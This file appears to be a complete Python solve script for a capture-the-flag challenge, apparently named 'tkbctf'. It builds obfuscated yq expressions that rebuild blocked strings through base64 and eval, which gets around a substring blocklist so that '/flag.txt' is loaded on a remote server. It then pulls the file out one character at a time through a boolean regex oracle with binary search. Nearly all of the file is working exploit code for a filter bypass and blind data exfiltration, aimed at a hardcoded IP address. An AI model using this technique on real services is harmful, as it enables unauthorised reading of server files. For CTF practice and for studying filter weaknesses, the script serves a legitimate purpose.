#!/usr/bin/env python3
import argparse
import base64
import os
import re
import socket
import stat
import string
import subprocess
import sys
import time
import urllib.request


YQ_VERSION = "v4.52.4"
YQ_URL = f"https://github.com/mikefarah/yq/releases/download/{YQ_VERSION}/yq_linux_amd64"
YQ_PATH = f"/tmp/yq-{YQ_VERSION}"
BLOCKLIST = ['"', ".", "env", "load", "file"]


def ensure_yq():
    if not os.path.exists(YQ_PATH):
        urllib.request.urlretrieve(YQ_URL, YQ_PATH)
        os.chmod(YQ_PATH, os.stat(YQ_PATH).st_mode | stat.S_IXUSR)
    return YQ_PATH


def build_char_map(yq_path):
    exprs = {
        "kind": "kind",
        "tag": "tag",
        "seq": "[]|kind",
        "map": "{}|kind",
        "bool": "false|tag",
        "false_json": "false|@json",
        "kind_json": "kind|@json",
        "xml": "({(kind):1}|@xml)",
        "props": "({(kind):{(kind):1}}|@props)",
        "matchkeys": "((kind|match((kind|split(style))[1]))|keys|join(style))",
        "kind_b64": "kind|@base64",
        "tag_b64": "tag|@base64",
        "map_b64": "{}|kind|@base64",
        "seq_b64": "[]|kind|@base64",
        "false_json_b64": "false|@json|@base64",
        "kind_json_b64": "kind|@json|@base64",
        "xml_b64": "(({(kind):1}|@xml)|@base64)",
        "props_b64": "(({(kind):{(kind):1}}|@props)|@base64)",
        "matchkeys_b64": "(((kind|match((kind|split(style))[1]))|keys|join(style))|@base64)",
    }
    char_map = {}
    for expr in exprs.values():
        out = run_yq(yq_path, expr).rstrip("\n")
        for i, ch in enumerate(out):
            char_map.setdefault(ch, f"(({expr})|split(style))[{i}]")
        up = try_run_yq(yq_path, f"({expr})|upcase")
        if up is not None:
            out = up.rstrip("\n")
            for i, ch in enumerate(out):
                char_map.setdefault(ch, f"(((({expr})|upcase)|split(style))[{i}])")
    for digit in string.digits:
        char_map.setdefault(digit, f"({digit}|tostring)")
    return char_map


def run_yq(yq_path, expr):
    proc = subprocess.run([yq_path, "-n", expr], capture_output=True, text=True, check=True)
    return proc.stdout


def try_run_yq(yq_path, expr):
    proc = subprocess.run([yq_path, "-n", expr], capture_output=True, text=True)
    if proc.returncode == 0:
        return proc.stdout
    return None


class Builder:
    def __init__(self, yq_path):
        self.yq_path = yq_path
        self.char_map = build_char_map(yq_path)
        self.cache = {}

    def ch_expr(self, ch):
        if ch in self.cache:
            return self.cache[ch]
        if ch in self.char_map:
            self.cache[ch] = self.char_map[ch]
            return self.cache[ch]
        b64 = base64.b64encode(ch.encode()).decode()
        expr = f"(([{','.join(self.ch_expr(c) for c in b64)}]|join(style))|@base64d)"
        self.cache[ch] = expr
        return expr

    def str_b64_expr(self, s):
        encoded = base64.b64encode(s.encode()).decode()
        return f"(([{','.join(self.ch_expr(c) for c in encoded)}]|join(style))|@base64d)"

    def build_probe(self, regex):
        target = f'(load("/flag.txt")|test("{regex}")) or error(1)'
        raw = f"eval({self.str_b64_expr(target)})"
        leaked = [item for item in BLOCKLIST if item in raw]
        if leaked:
            raise RuntimeError(f"blocked substrings leaked into probe: {leaked}")
        return raw


class Oracle:
    def __init__(self, host, port, builder):
        self.builder = builder
        self.sock = socket.create_connection((host, port), timeout=10)
        self.sock.settimeout(10)
        self._read_until(b"expr: ")
        self.count = 0
        self.start = time.time()

    def _read_until(self, suffix):
        data = b""
        while not data.endswith(suffix):
            chunk = self.sock.recv(1)
            if not chunk:
                raise EOFError("remote closed the connection")
            data += chunk
        return data

    def ask(self, regex):
        probe = self.builder.build_probe(regex)
        self.sock.sendall(probe.encode() + b"\n")
        line = self._read_until(b"\n").decode().strip()
        self._read_until(b"expr: ")
        self.count += 1
        if line == "ok":
            return True
        if line in {"error", "blocked"}:
            return False
        raise RuntimeError(f"unexpected remote reply: {line!r}")

    def close(self):
        try:
            self.sock.sendall(b"\n")
        except OSError:
            pass
        self.sock.close()


def esc_set(chars):
    return "".join("\\" + c if c in r"\^-]" else c for c in chars)


def range_class(lo, hi):
    return "[" + esc_set(lo) + "-" + esc_set(hi) + "]"


def list_class(chars):
    return "[" + esc_set(chars) + "]"


def find_in_range(oracle, prefix, lo, hi):
    chars = [chr(i) for i in range(ord(lo), ord(hi) + 1)]
    while len(chars) > 1:
        mid = len(chars) // 2
        left = chars[:mid]
        if oracle.ask("^" + re.escape(prefix) + range_class(left[0], left[-1])):
            chars = left
        else:
            chars = chars[mid:]
    return chars[0]


def find_in_list(oracle, prefix, chars):
    chars = list(chars)
    while len(chars) > 1:
        mid = len(chars) // 2
        left = chars[:mid]
        if oracle.ask("^" + re.escape(prefix) + list_class("".join(left))):
            chars = left
        else:
            chars = chars[mid:]
    return chars[0]


GROUPS = [
    ("range", " ", "/"),
    ("range", "0", "9"),
    ("range", ":", "@"),
    ("range", "A", "Z"),
    ("list", r"[\]^_`"),
    ("range", "a", "z"),
    ("list", "{|~"),
]


def solve(host, port, prefix):
    yq_path = ensure_yq()
    builder = Builder(yq_path)
    oracle = Oracle(host, port, builder)
    flag = prefix
    try:
        if not oracle.ask("^" + re.escape(prefix)):
            raise RuntimeError("initial prefix does not match the remote flag")
        while True:
            if oracle.ask("^" + re.escape(flag + "}") + "$"):
                flag += "}"
                break
            next_char = None
            for group in GROUPS:
                if group[0] == "range":
                    cls = range_class(group[1], group[2])
                    if oracle.ask("^" + re.escape(flag) + cls):
                        next_char = find_in_range(oracle, flag, group[1], group[2])
                        break
                else:
                    cls = list_class(group[1])
                    if oracle.ask("^" + re.escape(flag) + cls):
                        next_char = find_in_list(oracle, flag, group[1])
                        break
            if next_char is None:
                raise RuntimeError(f"no character bucket matched after {flag!r}")
            flag += next_char
            elapsed = time.time() - oracle.start
            print(f"{flag}  queries={oracle.count}  elapsed={elapsed:.1f}s", flush=True)
    finally:
        oracle.close()
    return flag


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="35.194.108.145")
    parser.add_argument("--port", type=int, default=29060)
    parser.add_argument("--prefix", default="tkbctf{")
    args = parser.parse_args()

    flag = solve(args.host, args.port, args.prefix)
    print(f"\nFLAG: {flag}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
